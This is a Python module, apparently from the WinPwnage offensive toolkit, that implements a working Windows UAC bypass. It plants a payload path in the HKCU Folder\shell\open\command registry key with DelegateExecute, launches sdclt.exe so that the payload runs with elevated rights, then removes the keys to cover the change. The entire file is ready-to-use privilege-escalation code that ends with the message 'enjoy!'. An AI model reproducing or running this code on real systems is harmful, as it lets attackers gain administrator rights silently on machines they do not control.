import os
import time
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass

sdclt_info = {
	"Description": "Bypass UAC using sdclt and registry key manipulation",
	"Id": "16",
	"Type": "UAC bypass",
	"Fixed In": "999999" if not information().uac_level() == 4 else "0",
	"Works From": "14393",
	"Admin": False,
	"Function Name": "sdclt_uacbypass",
	"Function Payload": True,
}


def sdclt_uacbypass(payload):
	if payloads().exe(payload):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
									os.path.join("Software\\Classes\\Folder\\shell\\open\\command"))
			_winreg.SetValueEx(key, None, 0, _winreg.REG_SZ, payload)
			_winreg.SetValueEx(key, "DelegateExecute", 0, _winreg.REG_SZ, None)
			_winreg.CloseKey(key)
		except Exception as error:
			print_error("Unable to create registry keys, exception was raised: {}".format(error))
			return False
		else:
			print_success("Successfully created Default and DelegateExecute key containing payload ({})".format(os.path.join(payload)))

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("sdclt.exe"):
				print_success("Successfully spawned process ({})".format(payload))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))

		time.sleep(5)

		try:
			key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\\Classes\\Folder\\shell\\open\\command", 0, _winreg.KEY_ALL_ACCESS)
			_winreg.DeleteValue(key, None)
			_winreg.DeleteValue(key, "DelegateExecute")
		except Exception as error:
			print_error("Unable to cleanup")
			return False
		else:
			print_success("Successfully cleaned up, enjoy!")
			
	else:
		print_error("Cannot proceed, invalid payload")
		return False
